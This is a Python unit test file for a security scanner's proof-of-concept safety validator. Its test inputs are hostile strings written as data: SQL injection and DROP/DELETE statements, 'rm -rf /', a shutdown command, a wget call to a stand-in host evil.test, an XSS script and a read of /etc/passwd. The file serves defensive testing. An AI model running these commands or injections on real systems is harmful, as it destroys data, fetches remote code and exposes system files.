"""Unit tests for the PoC safety validator — Story 4.10."""

from app.services.security_scan.poc_safety import validate_text_safety


class TestValidateTextSafety:
    def test_benign_payload_is_safe(self):
        check = validate_text_safety("' OR 1=1--", "wpisz payload", "zwraca dane")
        assert check.is_safe
        assert check.blocked_reasons == []

    def test_drop_table_blocked(self):
        check = validate_text_safety("1; DROP TABLE users--")
        assert not check.is_safe
        assert any("DROP" in r for r in check.blocked_reasons)

    def test_delete_from_blocked(self):
        check = validate_text_safety("'; DELETE FROM accounts--")
        assert not check.is_safe

    def test_rm_rf_blocked(self):
        check = validate_text_safety("; rm -rf /")
        assert not check.is_safe

    def test_shutdown_blocked(self):
        check = validate_text_safety("| shutdown -h now")
        assert not check.is_safe

    def test_remote_fetch_blocked(self):
        check = validate_text_safety("; wget http://evil.test/x")
        assert not check.is_safe

    def test_reason_in_steps_is_detected(self):
        check = validate_text_safety("safe-payload", "potem DROP DATABASE app", "efekt")
        assert not check.is_safe

    def test_xss_alert_is_safe(self):
        check = validate_text_safety("<script>alert(1)</script>")
        assert check.is_safe

    def test_read_passwd_is_safe(self):
        check = validate_text_safety("; cat /etc/passwd")
        assert check.is_safe
